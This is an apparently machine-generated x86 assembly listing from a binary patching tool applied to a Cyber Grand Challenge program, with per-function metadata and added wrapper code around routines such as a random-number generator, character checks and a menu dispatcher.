.text
.globl _start
.type _start,@function

.globl cgc_main
.type cgc_main,@function

/* ---------------------------------------------
   Compiled with Version Created:  Fri 07/08/16 16:50:00

      Number Instr. : 3964
              Calls : 248
           BadCalls : 0
              Jumps : 527
         Interrupts : 7
  Unique Call Dests : 68
  Unique Jump Dests : 370
         Functions  : 99
    Has Function Ptr : true

      Start Address : 0x804b5b5


       System Calls : 
          0x804b5c5:   terminate()    id:80(1) is Called
          0x804b5d3:   transmit()    id:81(2) is Called
          0x804b5f3:   receive()    id:82(3) is Called
          0x804b613:   fdwait()    id:85(4) is Called
          0x804b639:   allocate()    id:86(5) is Called
          0x804b653:   deallocate()    id:88(6) is Called
          0x804b667:   random()    id:89(7) is Called
 CRCX related data: 
          setJmpAddr = 0x804b681
         longJmpAddr = 0x804b69c
            crcxAddr = 0x804b6be
       crcxDocrcAddr = 0x0
        dpkgTxtStart = 0x804c090
        dpkgTxtEnd = 0x804caff

 Terminate Function : 0x804b5c5

    addFunctionWrapper:       true
    addPointerPatch:          false
    checkStackOverflowPatch:  false
    checkHeapOverflowPatch:   false
    checkGlobalOverflowPatch: false
    addSpecialFunctions:      true
    addTerminatePatch:        false
    addAllocatePatch:         false
    preProcess:               false
    printProlog:              false
    includeAnalysis:          false
    limitPatch:               false
    useEBP:                   true
    saveEBP:                   true
 --------------------------------------------- */
/* ------------- Section Header Information -------------
  ID     Name      Size      VMA        LMA       FileOff    Align
   0 .text       0x3668   0x80480a0   0x80480a0   0xa0     2**4(16)
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
   1 .rodata     0x5a2    0x804b708   0x804b708   0x3708   2**2(4)
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
   2 .data       0x142a7  0x804c000   0x804c000   0x4000   2**2(4)
                  CONTENTS, ALLOC, LOAD, DATA
   3 .bss        0x2a0    0x80602a8   0x80602a8   0x182a7  2**2(4)
                  ALLOC
   4 .comment    0x1d     0x0         0x0         0x182a7  2**0(1)
                  CONTENTS, READONLY

 Data Ranges: 0x804b708 - 0x8060547
            1: 0x804b708 - 0x804bca9
            2: 0x804c000 - 0x80602a6
            3: 0x80602a8 - 0x8060547

 Code Ranges: 
              0x804b5b5 - 0x804b707
              0x80480a0 - 0x804b707

  ------------------------------------------------------*/

/*-------------------------
;
;   Function 18   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 1498 (0x80495f0)
;       End Index : 1519 (0x8049629)
;   Num Instructs : 22
;      Stack Size : 0 (0x0)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0xc(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 2
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x2820,7
.p2align 3,0x2825
FuncPtr_0x80495f0:

Func_0x80495f0:

Label_0x80495f0:
   push    %edi                               # [0(1498)]stackSize = 0x4   #32
   push    %esi                               # [1(1499)]stackSize = 0x8   #32
   mov     0xc(%esp), %eax                    # [2(1500)]   #32
   test    %eax, %eax                         # [3(1501)]   #32
   je      Label_0x8049627 #32
   mov     0xc(%ecx), %esi                    # [5(1503)]Using Pointer PTRCHECK arg[0]    #32
   test    %esi, %esi                         # [6(1504)]   #32
   je      Label_0x8049621 #32
   test    %edx, %edx                         # [8(1506)]   #32
   je      Label_0x8049624 #32
Label_0x8049610: #p6a
   mov     %esi, %edi                         # [10(1508)]   #32
   mov     0x14(%edi), %esi                   # [11(1509)]Using Pointer PTRCHECK arg[0]    #32
   test    %esi, %esi                         # [12(1510)]   #32
   jne     Label_0x8049610 #32
   mov     %edx, 0x14(%edi)                   # [14(1512)]Using Pointer PTRCHECK arg[1]  Already checked [11]   #32
   mov     %edi, 0x10(%edx)                   # [15(1513)]Using Pointer PTRCHECK arg[1]    #32
   jmp     Label_0x8049624 #32
Label_0x8049621: #p6a
   mov     %edx, 0xc(%ecx)                    # [17(1515)]Using Pointer PTRCHECK arg[1]  Already checked [5]   #32
Label_0x8049624: #p6a
   add     %eax, 0x8(%ecx)                    # [18(1516)]Using Pointer PTRCHECK arg[1]    #32
Label_0x8049627: #p6a
   pop     %esi                               # [19(1517)]stackSize = 0x4   #32
   pop     %edi                               # [20(1518)]stackSize = 0x0   #32
Label_0x8049629: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:18 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 33   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2034 (0x8049f20)
;       End Index : 2210 (0x804a211)
;   Num Instructs : 177
;      Stack Size : 48 (0x30)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: true
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 7
;     ESP Offsets : 7
;                 :  0x0(0x30), 0x4(0x2c), 0xc(0x24), 0x20(0x10),
;                 :  0x24(0xc), 0x28(0x8), 0x2c(0x4); Function Pointers : 10
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x3620,7
.p2align 3,0x3625
FuncPtr_0x8049f20:

Func_0x8049f20:

Label_0x8049f20:
   push    %esi                               # [0(2034)]stackSize = 0x4   #32
   mov     Var_0x804c000, %eax                # [1(2035)]   #32
   mov     %eax, %ecx                         # [2(2036)]   #32
   shl     $0xb, %ecx                         # [3(2037)]   #32
   xor     %eax, %ecx                         # [4(2038)]   #32
   mov     Var_0x804c004, %eax                # [5(2039)]   #32
   mov     %eax, Var_0x804c000                # [6(2040)]   #32
   mov     Var_0x804c008, %eax                # [7(2041)]   #32
   mov     %eax, Var_0x804c004                # [8(2042)]   #32
   mov     Var_0x804c00c, %eax                # [9(2043)]   #32
   mov     %eax, Var_0x804c008                # [10(2044)]   #32
   mov     %eax, %edx                         # [11(2045)]   #32
   shr     $0x13, %edx                        # [12(2046)]   #32
   xor     %ecx, %eax                         # [13(2047)]   #32
   shr     $0x8, %ecx                         # [14(2048)]   #32
   xor     %eax, %ecx                         # [15(2049)]   #32
   xor     %edx, %ecx                         # [16(2050)]   #32
   mov     %ecx, Var_0x804c00c                # [17(2051)]   #32
   and     $0x1fff, %ecx                      # [18(2052)]   #32
   mov     Var_0x804c000, %eax                # [19(2053)]   #32
   mov     %eax, %edx                         # [20(2054)]   #32
   shl     $0xb, %edx                         # [21(2055)]   #32
   xor     %eax, %edx                         # [22(2056)]   #32
   mov     Var_0x804c004, %eax                # [23(2057)]   #32
   mov     %eax, Var_0x804c000                # [24(2058)]   #32
   mov     Var_0x804c008, %eax                # [25(2059)]   #32
   mov     %eax, Var_0x804c004                # [26(2060)]   #32
   mov     Var_0x804c00c, %eax                # [27(2061)]   #32
   mov     %eax, Var_0x804c008                # [28(2062)]   #32
   mov     %eax, %esi                         # [29(2063)]   #32
   shr     $0x13, %esi                        # [30(2064)]   #32
   xor     %edx, %eax                         # [31(2065)]   #32
   shr     $0x8, %edx                         # [32(2066)]   #32
   xor     %eax, %edx                         # [33(2067)]   #32
   xor     %esi, %edx                         # [34(2068)]   #32
   mov     %edx, Var_0x804c00c                # [35(2069)]   #32
   and     $0x1fff, %edx                      # [36(2070)]   #32
   pop     %esi                               # [37(2071)]stackSize = 0x0   #32
   push    %ebx                               # [38(2073)]stackSize = 0x4   #32
   push    %edi                               # [39(2074)]stackSize = 0x8   #32
   push    %esi                               # [40(2075)]stackSize = 0xc   #32
   sub     $0x30, %esp                        # [41(2076)]stackSize = 0x3c   #32
   mov     %edx, %edi                         # [42(2077)]   #32
   mov     %ecx, %esi                         # [43(2078)]   #32
   movl    $0x1, 0x28(%esp)                   # [44(2079)]   #32
   movl    $0x0, 0x2c(%esp)                   # [45(2080)]   #32
   mov     %esi, 0x20(%esp)                   # [46(2081)]   #32
   mov     %edi, 0x24(%esp)                   # [47(2082)]   #32
   mov     Var_0x80602ac, %eax                # [48(2083)]   #32
   movsd   0x20(%esp), %xmm0                  # [49(2084)]   #32
   movsd   0x28(%esp), %xmm1                  # [50(2085)]   #32
   movsd   %xmm1, 0xc(%esp)                   # [51(2086)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [52(2087)]   #32
   mov     %eax, (%esp)                       # [53(2088)]   #32
Label_0x8049ff2: #pn8

   pushl    0x24(%eax)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
   cmp     $0xfff, %esi                       # [55(2090)]   #32
   jg      Label_0x804a043 #32
   cmp     $0xfff, %edi                       # [57(2092)]   #32
   jg      Label_0x804a043 #32
   mov     %esi, 0x20(%esp)                   # [59(2094)]   #32
   lea     0x1(%edi), %ebx                    # [60(2095)] Loading Pointer with stackSize: 60   #32
   mov     %ebx, 0x24(%esp)                   # [61(2096)]   #32
   mov     Var_0x80602ac, %eax                # [62(2097)]   #32
   movsd   0x20(%esp), %xmm0                  # [63(2098)]   #32
   movsd   0x28(%esp), %xmm1                  # [64(2099)]   #32
   movsd   %xmm1, 0xc(%esp)                   # [65(2100)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [66(2101)]   #32
   mov     %eax, (%esp)                       # [67(2102)]   #32
Label_0x804a030: #pn8

   pushl    0x24(%eax)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
   mov     %esi, 0x20(%esp)                   # [69(2104)]   #32
   add     $0x2, %edi                         # [70(2105)]   #32
   mov     %edi, 0x24(%esp)                   # [71(2106)]   #32
   jmp     Label_0x804a0e2 #32
Label_0x804a043: #p6a
   cmp     $0x1000, %esi                      # [73(2108)]   #32
   jl      Label_0x804a091 #32
   cmp     $0xfff, %edi                       # [75(2110)]   #32
   jg      Label_0x804a091 #32
   mov     %esi, 0x20(%esp)                   # [77(2112)]   #32
   lea     0x1(%edi), %ebx                    # [78(2113)] Loading Pointer with stackSize: 60   #32
   mov     %ebx, 0x24(%esp)                   # [79(2114)]   #32
   mov     Var_0x80602ac, %eax                # [80(2115)]   #32
   movsd   0x20(%esp), %xmm0                  # [81(2116)]   #32
   movsd   0x28(%esp), %xmm1                  # [82(2117)]   #32
   movsd   %xmm1, 0xc(%esp)                   # [83(2118)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [84(2119)]   #32
   mov     %eax, (%esp)                       # [85(2120)]   #32
Label_0x804a07e: #pn8

   pushl    0x24(%eax)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
   mov     %esi, 0x20(%esp)                   # [87(2122)]   #32
   add     $0x2, %edi                         # [88(2123)]   #32
   mov     %edi, 0x24(%esp)                   # [89(2124)]   #32
   jmp     Label_0x804a18c #32
Label_0x804a091: #p6a
   cmp     $0xfff, %esi                       # [91(2126)]   #32
   jg      Label_0x804a13b #32
   cmp     $0x1000, %edi                      # [93(2128)]   #32
   jl      Label_0x804a13b #32
   mov     %esi, 0x20(%esp)                   # [95(2130)]   #32
   lea     0x1(%edi), %ebx                    # [96(2131)] Loading Pointer with stackSize: 60   #32
   mov     %ebx, 0x24(%esp)                   # [97(2132)]   #32
   mov     Var_0x80602ac, %eax                # [98(2133)]   #32
   movsd   0x20(%esp), %xmm0                  # [99(2134)]   #32
   movsd   0x28(%esp), %xmm1                  # [100(2135)]   #32
   movsd   %xmm1, 0xc(%esp)                   # [101(2136)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [102(2137)]   #32
   mov     %eax, (%esp)                       # [103(2138)]   #32
Label_0x804a0d4: #pn8

   pushl    0x24(%eax)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
   mov     %esi, 0x20(%esp)                   # [105(2140)]   #32
   lea     0x2(%edi), %eax                    # [106(2141)] Loading Pointer with stackSize: 60   #32
   mov     %eax, 0x24(%esp)                   # [107(2142)]   #32
Label_0x804a0e2: #p6a
   mov     Var_0x80602ac, %eax                # [108(2143)]   #32
   movsd   0x20(%esp), %xmm0                  # [109(2144)]   #32
   movsd   0x28(%esp), %xmm1                  # [110(2145)]   #32
   movsd   %xmm1, 0xc(%esp)                   # [111(2146)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [112(2147)]   #32
   mov     %eax, (%esp)                       # [113(2148)]   #32
Label_0x804a102: #pn8

   pushl    0x24(%eax)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
   lea     -0x1(%esi), %eax                   # [115(2150)] Loading Pointer with stackSize: 60   #32
   mov     %eax, 0x20(%esp)                   # [116(2151)]   #32
   mov     %edi, 0x24(%esp)                   # [117(2152)]   #32
   mov     Var_0x80602ac, %eax                # [118(2153)]   #32
   movsd   0x20(%esp), %xmm0                  # [119(2154)]   #32
   movsd   0x28(%esp), %xmm1                  # [120(2155)]   #32
   movsd   %xmm1, 0xc(%esp)                   # [121(2156)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [122(2157)]   #32
   mov     %eax, (%esp)                       # [123(2158)]   #32
Label_0x804a130: #pn8

   pushl    0x24(%eax)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
   add     $-0x2, %esi                        # [125(2160)]   #32
   jmp     Label_0x804a1e0 #32
Label_0x804a13b: #p6a
   cmp     $0x1000, %esi                      # [127(2162)]   #32
   jl      Label_0x804a20b #32
   cmp     $0x1000, %edi                      # [129(2164)]   #32
   jl      Label_0x804a20b #32
   mov     %esi, 0x20(%esp)                   # [131(2166)]   #32
   lea     0x1(%edi), %ebx                    # [132(2167)] Loading Pointer with stackSize: 60   #32
   mov     %ebx, 0x24(%esp)                   # [133(2168)]   #32
   mov     Var_0x80602ac, %eax                # [134(2169)]   #32
   movsd   0x20(%esp), %xmm0                  # [135(2170)]   #32
   movsd   0x28(%esp), %xmm1                  # [136(2171)]   #32
   movsd   %xmm1, 0xc(%esp)                   # [137(2172)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [138(2173)]   #32
   mov     %eax, (%esp)                       # [139(2174)]   #32
Label_0x804a17e: #pn8

   pushl    0x24(%eax)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
   mov     %esi, 0x20(%esp)                   # [141(2176)]   #32
   lea     0x2(%edi), %eax                    # [142(2177)] Loading Pointer with stackSize: 60   #32
   mov     %eax, 0x24(%esp)                   # [143(2178)]   #32
Label_0x804a18c: #p6a
   mov     Var_0x80602ac, %eax                # [144(2179)]   #32
   movsd   0x20(%esp), %xmm0                  # [145(2180)]   #32
   movsd   0x28(%esp), %xmm1                  # [146(2181)]   #32
   movsd   %xmm1, 0xc(%esp)                   # [147(2182)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [148(2183)]   #32
   mov     %eax, (%esp)                       # [149(2184)]   #32
Label_0x804a1ac: #pn8

   pushl    0x24(%eax)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
   lea     0x1(%esi), %eax                    # [151(2186)] Loading Pointer with stackSize: 60   #32
   mov     %eax, 0x20(%esp)                   # [152(2187)]   #32
   mov     %edi, 0x24(%esp)                   # [153(2188)]   #32
   mov     Var_0x80602ac, %eax                # [154(2189)]   #32
   movsd   0x20(%esp), %xmm0                  # [155(2190)]   #32
   movsd   0x28(%esp), %xmm1                  # [156(2191)]   #32
   movsd   %xmm1, 0xc(%esp)                   # [157(2192)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [158(2193)]   #32
   mov     %eax, (%esp)                       # [159(2194)]   #32
Label_0x804a1da: #pn8

   pushl    0x24(%eax)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
   add     $0x2, %esi                         # [161(2196)]   #32
Label_0x804a1e0: #p6a
   mov     %esi, 0x20(%esp)                   # [162(2197)]   #32
   mov     %ebx, 0x24(%esp)                   # [163(2198)]   #32
   mov     Var_0x80602ac, %eax                # [164(2199)]   #32
   movsd   0x20(%esp), %xmm0                  # [165(2200)]   #32
   movsd   0x28(%esp), %xmm1                  # [166(2201)]   #32
   movsd   %xmm1, 0xc(%esp)                   # [167(2202)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [168(2203)]   #32
   mov     %eax, (%esp)                       # [169(2204)]   #32
Label_0x804a208: #pn8

   pushl    0x24(%eax)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
Label_0x804a20b: #p6a
   add     $0x30, %esp                        # [171(2206)]stackSize = 0xc   #32
   pop     %esi                               # [172(2207)]stackSize = 0x8   #32
   pop     %edi                               # [173(2208)]stackSize = 0x4   #32
   pop     %ebx                               # [174(2209)]stackSize = 0x0   #32
Label_0x804a211: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:33 Patched 0 in 0.003 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 19: cgc_main

     adding function wrapper

;     Start Index : 1523 (0x8049630)
;       End Index : 1537 (0x8049677)
;   Num Instructs : 15
;      Stack Size : 12 (0xc)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 6
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 2
;                 :  0x0(0xc), 0x4(0x8); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x2920,7
.p2align 3,0x2925
FuncPtr_0x8049630:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049630,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049630:

cgc_main:

Label_0x8049630:
   sub     $0xc, %esp                         # [0(1523)]stackSize = 0xc   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049633
   .long    Func_0x804a220  #pp1w: Label_0x804a220 VAR_ADDRESS #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049638
   .long    Func_0x8048400  #pp1w: Label_0x8048400 VAR_ADDRESS #32
   mov     %eax, Var_0x80602ac                # [3(1526)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049642
   .long    Func_0x8049ea0  #pp1w: Label_0x8049ea0 VAR_ADDRESS #32
Label_0x8049650: #p6a
   call    _FuncWrapperHeader      # 2. my address is 0x8049650
   .long    Func_0x8049c90  #pp1w: Label_0x8049c90 VAR_ADDRESS #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049655
   .long    Func_0x8049680  #pp1w: Label_0x8049680 VAR_ADDRESS #32
   test    %eax, %eax                         # [7(1530)]   #32
   jne     Label_0x8049650 #32
   movl    $Var_0x804b780, 0x4(%esp)          # [9(1532)]   #32
   movl    $0x1, (%esp)                       # [10(1533)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804966d
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   xor     %eax, %eax                         # [12(1535)]   #32
   add     $0xc, %esp                         # [13(1536)]stackSize = 0x0   #32
Label_0x8049677: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:19 Patched 0 in 0.003 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 37   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2312 (0x804a380)
;       End Index : 2317 (0x804a38f)
;   Num Instructs : 6
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x2520,7
.p2align 3,0x2525
FuncPtr_0x804a380:

Func_0x804a380:

Label_0x804a380:
   mov     0x4(%esp), %eax                    # [0(2312)]   #32
   add     $-0x30, %eax                       # [1(2313)]   #32
   cmp     $0xa, %eax                         # [2(2314)]   #32
   sbb     %eax, %eax                         # [3(2315)]   #32
   and     $0x1, %eax                         # [4(2316)]   #32
Label_0x804a38f: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:37 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 38   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2318 (0x804a390)
;       End Index : 2323 (0x804a39f)
;   Num Instructs : 6
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x6920,7
.p2align 3,0x6925
FuncPtr_0x804a390:

Func_0x804a390:

Label_0x804a390:
   mov     0x4(%esp), %eax                    # [0(2318)]   #32
   add     $-0x61, %eax                       # [1(2319)]   #32
   cmp     $0x1a, %eax                        # [2(2320)]   #32
   sbb     %eax, %eax                         # [3(2321)]   #32
   and     $0x1, %eax                         # [4(2322)]   #32
Label_0x804a39f: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:38 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 39   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2324 (0x804a3a0)
;       End Index : 2329 (0x804a3af)
;   Num Instructs : 6
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x2220,7
.p2align 3,0x2225
FuncPtr_0x804a3a0:

Func_0x804a3a0:

Label_0x804a3a0:
   mov     0x4(%esp), %eax                    # [0(2324)]   #32
   add     $-0x41, %eax                       # [1(2325)]   #32
   cmp     $0x1a, %eax                        # [2(2326)]   #32
   sbb     %eax, %eax                         # [3(2327)]   #32
   and     $0x1, %eax                         # [4(2328)]   #32
Label_0x804a3af: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:39 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 71   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2330 (0x804a3b0)
;       End Index : 2333 (0x804a3bd)
;   Num Instructs : 4
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x7820,7
.p2align 3,0x7825
FuncPtr_0x804a3b0:

Func_0x804a3b0:

Label_0x804a3b0:
   cmpl    $0x80, 0x4(%esp)                   # [0(2330)]   #32
   sbb     %eax, %eax                         # [1(2331)]   #32
   and     $0x1, %eax                         # [2(2332)]   #32
Label_0x804a3bd: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:71 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 84   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2335 (0x804a3c0)
;       End Index : 2342 (0x804a3d5)
;   Num Instructs : 8
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x420,7
.p2align 3,0x425
FuncPtr_0x804a3c0:

Func_0x804a3c0:

Label_0x804a3c0:
   mov     0x4(%esp), %eax                    # [0(2335)]   #32
   cmp     $0x20, %eax                        # [1(2336)]   #32
   sete    %cl                                # [2(2337)]   #32
   cmp     $0x9, %eax                         # [3(2338)]   #32
   sete    %al                                # [4(2339)]   #32
   or      %cl, %al                           # [5(2340)]   #32
   movzbl  %al, %eax                          # [6(2341)]   #32
Label_0x804a3d5: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:84 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 20
     adding function wrapper

;     Start Index : 1538 (0x8049680)
;       End Index : 1591 (0x8049743)
;   Num Instructs : 54
;      Stack Size : 12 (0xc)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 8
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 2
;                 :  0x0(0xc), 0x4(0x8); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5420,7
.p2align 3,0x5425
FuncPtr_0x8049680:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049680,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049680:

Label_0x8049680:
   sub     $0xc, %esp                         # [0(1538)]stackSize = 0xc   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049683
   .long    Func_0x8049750  #pp1w: Label_0x8049750 VAR_ADDRESS #32
   cmp     $0xff, %al                         # [2(1540)]   #32
   je      Label_0x80496c2 #32
   movsbl  %al, %eax                          # [4(1542)]   #32
   cmpl    $0x0, Var_0x80602b0                # [5(1543)]   #32
   jle     Label_0x80496cc #32
   mov     Var_0x80602b4, %cl                 # [7(1545)]   #32
   add     $-0x31, %eax                       # [8(1546)]   #32
   test    %cl, %cl                           # [9(1547)]   #32
   je      Label_0x80496d8 #32
   cmp     $0x4, %eax                         # [11(1549)]   #32
   ja      Label_0x80496dd #32
   jmp     *Var_0x804b76c(, %eax ,  0x4)      # [13(1551)]Jump Pointer -- absolute addressHere 0   #32
Label_0x80496b4: #p6a
   call    _FuncWrapperHeader      # 2. my address is 0x80496b4
   .long    Func_0x80499c0  #pp1w: Label_0x80499c0 VAR_ADDRESS #32
   mov     $0x1, %eax                         # [15(1553)]   #32
   add     $0xc, %esp                         # [16(1554)]stackSize = 0x0   #32
Label_0x80496c1: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x80496c2: #p6a
   movl    $Var_0x804b78c, 0x4(%esp)          # [18(1556)]   #32
   jmp     Label_0x80496e5 #32
Label_0x80496cc: #p6a
   cmp     $0x32, %eax                        # [20(1558)]   #32
   je      Label_0x804970f #32
   cmp     $0x31, %eax                        # [22(1560)]   #32
   jne     Label_0x80496dd #32
   jmp     Label_0x804971a #32
Label_0x80496d8: #p6a
   cmp     $0x3, %eax                         # [25(1563)]   #32
   jbe     Label_0x80496fa #32
Label_0x80496dd: #p6a
   movl    $Var_0x804b797, 0x4(%esp)          # [27(1565)]   #32
Label_0x80496e5: #p6a
   movl    $0x1, (%esp)                       # [28(1566)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80496ec
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   mov     $-0x1, %eax                        # [30(1568)]   #32
   add     $0xc, %esp                         # [31(1569)]stackSize = 0x0   #32
Label_0x80496f9: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x80496fa: #p6a
   jmp     *Var_0x804b75c(, %eax ,  0x4)      # [33(1571)]Jump Pointer -- absolute addressHere 0   #32
Label_0x8049701: #p6a
   call    _FuncWrapperHeader      # 2. my address is 0x8049701
   .long    Func_0x8049ba0  #pp1w: Label_0x8049ba0 VAR_ADDRESS #32
   mov     $0x1, %eax                         # [35(1573)]   #32
   add     $0xc, %esp                         # [36(1574)]stackSize = 0x0   #32
Label_0x804970e: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x804970f: #p6a
   call    _FuncWrapperHeader      # 2. my address is 0x804970f
